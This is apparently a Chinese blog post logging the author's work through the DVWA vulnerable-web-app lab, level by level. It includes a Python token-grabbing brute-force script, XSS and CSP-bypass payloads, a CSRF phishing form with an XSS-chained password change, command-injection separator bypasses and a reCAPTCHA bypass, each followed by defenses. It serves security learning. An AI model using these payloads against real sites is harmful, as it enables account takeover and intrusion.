---
layout: post
title: "DVWA靶场学习记录"
date:   2021/4/9
tags: [靶场, DVWA]
comments: true
mermaid: true
author: c-uncle
---



# DVWA靶场学习记录

## 概述

本文章是我学习DVWA靶场的学习记录，记录了学习过程中的思路和实验。

## Brute Force

暴力破解，指使用脚本或其他工具来爆破密码，验证码等。

靶场给出的场景是一个登录功能。

### Low

在low难度下，程序没有做任何防护，攻击者可以编写python脚本或使用BurpSuite（以下简称bp）的爆破模块来爆破用户名和密码。

当然你也可以使用sql注入，因为程序没有做对sql注入的防护。

### Medium

在medium难度下，对用户输入的username和password进行了特殊字符转义处理，防御了SQL注入。但是还是可以通过脚本或bp来爆破密码。

程序使用了mysqli_real_escape_string()函数对特殊字符进行了处理，特殊字符会被 转义符转义。

### High

在high难度下，页面提交的表单添加了user_token字段，用来验证请求是否合法。

![image-隐藏的token](https://github.com/C-uncle/c-uncle.github.io/blob/master/images/DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/BruteForce-high-%E9%9A%90%E8%97%8F%E7%9A%84token.png?raw=true)

可以从图片里看到，表单里隐藏了一个user_token。

这个user_token是不能重复使用的。因此常规的bp爆破模块是用不了的。

这里我写了一个python脚本，用来获取token，并且爆破密码。

```
'''
author: CUncle
data: 2021/4/3
function: dvwa brute high exp
'''
import requests
import re

// 将流量导向bp，开发时用的。
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

// 登录dvwa后的cookies
cookies = {
    'security': 'high',
    'PHPSESSID': 'a91156e24ae52243c852449283bc6832'
}

// 程序会对请求头里的reference进行验证，验证请求来自合法的域名。
headers = {
	'reference': ''
}

// 获取password
def read_passwd():
	f = open('top500.txt')
	passwd = f.readline()
	while passwd:
		// 先将password进行处理，去掉换行符，然后调用poc函数进行验证
		if poc(passwd.strip()):
			print(passwd)
			break
		passwd = f.readline()

def getUserToken():
	url = "http://localhost/dvwa/vulnerabilities/brute/index.php"
	res = requests.get(url, cookies=cookies, proxies=proxies)
	result = re.search(r'<input type=\'hidden\' name=\'user_token\' value=\'(.*?)\' />', res.text)
	return result.group(1)

def poc(passwd):
	user_token = getUserToken()
	url = "http://localhost/dvwa/vulnerabilities/brute/index.php?username=admin&password=%s&Login=Login&user_token=%s"%(passwd, user_token)
	headers['reference'] = url
	res = requests.get(url, cookies=cookies, headers=headers, proxies=proxies)
	if not "incorrect" in res.text:
		return True
	else :
		return False

read_passwd()
```

### Impossible

在impossible难度下，程序限制了密码错误次数，并且在错误一定次数后，冻结账号一段时间。

### 防御方式

1.添加token，防止一个数据包被重复利用。

2.做错误次数限制，防止脚本爆破。

## Command Injection

命令行注入。

原理：程序提供了命令执行功能，但未对用户的输入进行处理，导致恶意命令被执行。

靶场提供的场景是用户输入一个ip，程序对这个ip执行ping命令。

### Low

在low难度下，没做任何防护，可以使用管道符来拼接命令。

几个常见的管道符。

Windows和linud都有的。

\| 

Usage： A\|B

将A的输出作为参数传给B

\|\| 

Usage：A\|\|B\|\|C\|\|D

可以同时执行多条命令，当碰到执行正确的命令时停止执行。

&

Usage：A&B

可以同时执行多条命令，不管执行是否正确，全都会执行。

&&

Usage：A&&B&&C&&D

可以同时执行多条命令，当碰到执行错误的命令时停止执行。

Linux下的符号

;

Usage:  A;B

执行完A以后执行B

### Medium

在medium难度下，程序过滤了 &&和; ，可以使用其他几个管道符来绕过。

### High

在high难度下，程序过滤上面提及的所有管道符，还过滤了括号和`。

\` 倒引号。

被\` 包括的字符串会被当作命令执行。

但是过滤规则不够严谨，\| 符号的过滤规则写成了过滤 '\| '(带有空格)。

可以在\|后面加上空格绕过。

### Impossible

在Impossible难度下，程序对用户的输入进行了处理，限制了输入的格式只能是ipv4地址。

### 防御方式

1.如果只是执行某一个命令，例如ping，那么我们可以设置白名单，确保用户传递的参数不会携带恶意命令。

2.过滤用户输入，过滤管道符和一些关键字，例如|， &， bash等。

## CSRF

攻击者利用目标用户的身份，以目标用户的名义执行非法操作。

靶场给的场景是一个修改密码的页面。

### Low

没有做任何防护，可以直接构造钓鱼页面。

一个简便的构造钓鱼页面的方法：

使用BP抓取修改密码的数据包，右键选择构造CSRF Poc。

![image-BP构造CSRF-poc](https://github.com/C-uncle/c-uncle.github.io/blob/master/images/DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/CSRF-BP%E6%9E%84%E9%80%A0%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2.png?raw=true)

### Medium

程序对请求的referer字段做了验证，验证请求是否来自同源。

在这种情况下，需要结合其他漏洞来利用。

我是使用xss+csrf的组合拳。

下面是我构造的xss的payload

```
<SCRIPT>const http = new XMLHttpRequest();const url = "http://localhost/dvwa/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change";http.open("GET", url);http.send();</SCRIPT>
```

### High

这个难度在get参数中多加了一个user_token参数，估计作用类似与Brute Froce中user_token一样，用来确定请求是否从指定的页面发起。

这关并没用对referer做验证。

我尝试用js获取页面内容，从而来获取token，但是不行，有cors。

需要结合其他漏洞。

比如页面上有xss，或许可以利用xss来获取token。

思路：先利用xss获取token，然后构造钓鱼页面。

xss的payload

```
<iframe src="../csrf" onload=alert(frames[0].document.getElementsByName('user_token')[0].value)>
```

那我的payload要放在哪里？

尝试一下放在反射型xss。

钓鱼页面

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/dvwa/vulnerabilities/csrf/">
      <input type="hidden" name="password&#95;new" value="123" />
      <input type="hidden" name="password&#95;conf" value="123" />
      <input type="hidden" name="Change" value="Change" />
	  <input type="hidden" name="user_token" value="17936e9fa62e18734489c63edbcdfd16" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

只要将利用xss获取的token放入表单中就可以了

可以将xss的payload放在store类xss中，这样我就可以不断的获取token。

这个攻击需要两步。

第一步，受害者点击xss页面，token泄露。

第二步，受害者点击钓鱼页面，发生恶意修改密码。



不过话说回来，我都能通过xss拿到token了，如果要是可以拿走cookie，那我就能改他密码了，即不用第二步。

### Impossible

在impossible难度下，多加了一个旧密码的验证。

### 防御方式

1.对请求头部里的referer字段进行验证，确保请求来自受信任的域名。

2.设置不可伪造的csrf_token，用来验证请求是否合法。

3.如果是修改密码或其他修改重要信息的页面，可以要求用户输入一个可以来验证身份的信息。

## File Inclusion

文件包含漏洞，页面带有文件包含的功能，攻击者可以让页面去包含一些恶意的页面或通过协议去获取敏感信息，甚至获取webshell。

靶场提给的场景是一个带有文件包含功能的页面，用户可以包含三个网站提供的文件，分别为file1.php，file2.php，file3.php。

### Low

没有做任何防护，可以去包含服务器上的敏感文件，或者使用http/https协议去远程包含恶意文件，还可以使用伪协议去执行代码或获取文件。

### Medium

对文件进行了处理，过滤了http/https，防止包含远程文件。过滤了 ../，防止访问其他目录下的文件。

可以使用双写绕过这两个过滤策略。

此外还可以使用伪协议去执行代码，或获取敏感文件。

过滤了../，导致不能使用相对路径，但是如果能知道绝对路径的话，还是可以获取服务器上的的文件。

### High

网站做白名单限制，只有file开头的文件和include.php才能正常包含。

这导致了大部分协议不能使用。但是file协议还能使用。

可以结合文件上传漏洞来利用。

### Impossible

做了更加严格的白名单限制。

### 防御方式

1.设置白名单，限制可包含的文件。

2.如非必须，请勿开启远程包含。如一定要开启，一定要去验证请求的url是否受合法（验证域名是否可信任）。

3.对协议进行限制，过来掉不是必须的协议。

## File Upload

文件上传漏洞，网站提供文件上传功能，攻击者可以上传恶意文件来攻击网站。

靶场提供的场景是一个简单的文件上传功能。

### Low

没有任何防护，可以直接上传一句话木马。

### Medium

只是对上传的文件类型做了判断，没有对后缀做判断。

只要修改content-type就可以了。

### High

修改content-type无效，可能对后缀做了检测。

上传奇怪后缀的文件失败，可能是白名单。

上传路径不可控。

带有文件头检测，图片马需要加文件头才上传。

### Impossible

对上传的文件进行重构，这意味着图片马里的木马会被清除。

### 防御方式

1.设置白名单，限制可上传的文件。

2.对上传的文件进行检测，防止文件里携带恶意代码。尤其是图片，极有可能包含有一句话木马。

3.验证后缀。

## Insecure CAPTCHA

验证功能可以被攻击者绕过。

靶场提供的场景是一个修改密码的页面，这个页面带有验证功能。

### Low

分析源码以后，发现修改密码分为两步。

第一步，验证。

第二步，更新数据库。

POST的参数中，step参数表示当前是修改密码的第几步。

将step修改为2，即可绕过第一步验证。

### Medium

在第二步中，POST的参数多了一个passed_captcha，用来判断是否经过第一步验证。

直接构造第二步的数据包，加上一个passed_captcha参数，内容随意，程序只验证是否有该参数。

### High

分析源码后发现，程序将验证用户和修改密码两步合为一个数据包。

程序验证用户有两种验证方法。

1.验证$\_POST['g-recaptcha-response']是否与$\_DVWA[ 'recaptcha_private_key' ]一致。

2.验证$\_POST['g-recaptcha-response']是否为'hidd3n_valu3'，并且请求头中的user_agent是否为'reCAPTCHA'。



第一种验证方法不太好绕过，因为很难拿到recaptcha_private_key。

第二种验证方法可以绕过，只要在请求的body部分，添加g-recaptcha-response=hidd3n_valu3，并且将请求头中的user_agent修改为reCAPTCHA即可。

### Impossible

要求提供旧密码，并对旧密码进行了验证。去掉了High里验证用户的第二种方法。

### 防御方式

1.设置验证次数，防止攻击者枚举验证码进行爆破。

2.如果第一步的验证成功了，做个标记。

## Weak Session IDs

弱Session ID漏洞。Session ID有规律，可以被攻击者伪造。

靶场提供的场景是一个可以生成Session id的页面。

### Low

只是单纯的数字加一。

### Medium

这关变成了时间戳。

### High

这关也是数字加一，但是对数字进行了md5加密。

### Impossible

这关的ID是一个随机数+时间戳+固定字符串（“impossible”）经过sha1运算的结果。

### 防御方式

1.对Session进行加密

2.用随机数去创建Session，最好带上一个不容易猜到的字符串，防止随机数被破解。

## XSS (DOM)

XSS的一种，利用修改DOM文档来实现xss攻击。与反射型xss区别在于，DOM型不需要传到服务器。

靶场提供的场景是选择页面语言的功能。

### Medium

```
<form name="XSS" method="GET">
	<select name="default">
		<script>
			if (document.location.href.indexOf("default=") >= 0) {
				var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
				document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
					document.write("<option value='' disabled='disabled'>----</option>");
			}    
			document.write("<option value='English'>English</option>");
			document.write("<option value='French'>French</option>");
			document.write("<option value='Spanish'>Spanish</option>");
			document.write("<option value='German'>German</option>");
		</script>
	</select>
	<input type="submit" value="Select" />
</form>
```

第五行，lang的值是document.location.href.substring(document.location.href.indexOf("default=")+8);

document.location.href 指的是浏览器里的url。

str.substring(pos)函数可以获取str从pos到结尾的字符串。

document.location.href.indexOf("default=") 返回的是字符串"default="在url中的位置。+8以后就是url中default的值。

```
paylod：English #<script>alert(1)</script>
```

ps：#后面的内容不会传到服务器。

ps：English后面要带有空格。

由于#&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;不会被传到服务器，所以它会被js代码读取，并放到html里面。

若要尝试使用其他XSS payload，如img、svg等标签，因为select标签内只允许内嵌option标签，而option标签中能内嵌script标签但不能内嵌img等标签，因此需要在注入时先闭合option和select标签从而使注入的标签逃逸出来执行XSS

### High

如果嫌麻烦，直接上Medium的payload就好了。

```
payload：
'></option></select><img src="1" onerror="alert(1)">
```

emmm，只能用Medium的那种思路，因为服务器设置了白名单，限制了参数的内容。

### Impossible

因为服务器的设置，浏览器没有对url中的代码进行url解码，所以js代码无法生效。

这是Medium的js代码

![image-3](https://github.com/C-uncle/c-uncle.github.io/blob/master/images/DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/XSS-DOM-medium代码.png?raw=true)

这是Impossible的js代码

![image-3](https://github.com/C-uncle/c-uncle.github.io/blob/master/images/DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/XSS-DOM-Impossible代码.png?raw=true)

可以看出来，Impossible的js代码没有对url的内容进行解码。

ps：浏览器为了防止xss，是默认不对url进行解码的。

### 防御方式

1.对用户的输入进行实体编码。

2.不要随便对用户的输入进行url解码，浏览器一般默认不解码。

3.小心callback的名称，很容易被xss。

## CSP Bypass

什么是CSP？

Content Security Policy，内容安全策略。

用来限制网站可执行的js脚本来源。

在服务器响应的头部中带有Content-Security-Policy。

用来标识哪些资源是允许加载的。

CSP Bypass，内容安全策略被攻击者绕过。

### Low

https://pastebin.com/ 是受信任的。

可以到这个网站写一个带有js代码的页面，然后将这个页面的链接放到输入框中。

### Medium

Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';

这个策略的意思是，script-src 指js脚本的来源，‘self’，只能来自当前域名，‘unsafe-inline’，允许页面内嵌脚本，‘nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=’，页面内嵌的脚本要带有这个参数，才可以执行。

```
payload：<script nonce='TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA='>alert(1)</script>
```

### High

![image-2](https://github.com/C-uncle/c-uncle.github.io/blob/master/images/DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/CSP-code1.png?raw=true)

这是High的代码。看到这里有一个$_POST['include']是可控的。

![image-2](https://github.com/C-uncle/c-uncle.github.io/blob/master/images/DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/CSP-code2.png?raw=true)

这是jsonp.php的代码。在这里，$callback也是一个可控的参数。

payload：

```
<script src="source/jsonp.php?callback=alert('hacked');"></script>
```

将上面这个payload作为include的值，用POST发送给http://localhost/dvwa/vulnerabilities/csp/页面。



```mermaid
graph TD;
	点击按钮-->发起请求jsonp.php?callback=solveSum;
	发起请求jsonp.php?callback=solveSum-->返回要执行的JS代码;
	返回要执行的JS代码-->浏览器执行JS代码;
	
	
```

浏览器会将jsonp.php返回的内容当成js代码解析。而从上面的代码，我们得知，callback是可控的，我们可以将xss代码做callback传给jsonp.php，形成xss注入。

### Impossible

限制了callback名称，不允许用户自定义名称。

### 防御方式

1.更严谨的内容安全策略。

